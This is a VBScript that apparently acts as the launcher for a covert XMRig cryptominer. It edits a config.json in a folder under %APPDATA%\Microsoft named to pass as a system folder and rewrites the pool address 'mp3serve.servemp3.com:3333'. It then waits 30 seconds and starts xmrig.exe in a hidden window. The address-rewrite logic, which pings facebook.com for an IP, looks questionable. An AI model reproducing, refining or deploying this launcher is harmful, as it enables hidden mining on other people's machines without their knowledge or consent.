Option Explicit

Dim objFSO, objShell, jsonFile, jsonContent, objFile, pingResult, xmrigPath

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Paths
jsonFile = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MyFolderM\config.json")
xmrigPath = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MyFolderM\xmrig.exe")

' Check if config.json exists and is writable
If Not objFSO.FileExists(jsonFile) Then
    MsgBox "config.json not found. Exiting."
    WScript.Quit
ElseIf objFSO.GetFile(jsonFile).Attributes And 1 Then
    objFSO.GetFile(jsonFile).Attributes = objFSO.GetFile(jsonFile).Attributes Xor 1 ' Make writable
End If

' Ping facebook.com to get the current IP
Dim objExec, ipAddress, regex, matches
Set objExec = objShell.Exec("ping -n 1 facebook.com")
Do While objExec.Status = 0
    WScript.Sleep 100
Loop

pingResult = objExec.StdOut.ReadAll

' Extract IP address
Set regex = New RegExp
regex.Pattern = "\b\d{1,3}(\.\d{1,3}){3}\b" ' Matches IPv4
regex.Global = False
Set matches = regex.Execute(pingResult)

If matches.Count > 0 Then
    ipAddress = matches(0).Value
Else
    MsgBox "Failed to retrieve IP address. Exiting."
    WScript.Quit
End If

' Read and modify config.json
Set objFile = objFSO.OpenTextFile(jsonFile, 1, False)
jsonContent = objFile.ReadAll
objFile.Close

jsonContent = Replace(jsonContent, """url"": ""mp3serve.servemp3.com:3333""", """url"": """ & ipAddress & ":3333""")

Set objFile = objFSO.OpenTextFile(jsonFile, 2, False)
objFile.Write jsonContent
objFile.Close

' Wait 30 seconds before launching xmrig
WScript.Sleep 30000

' Launch xmrig.exe
If objFSO.FileExists(xmrigPath) Then
    objShell.Run """" & xmrigPath & """", 0, False
Else
    MsgBox "xmrig.exe not found. Exiting."
    WScript.Quit
End If
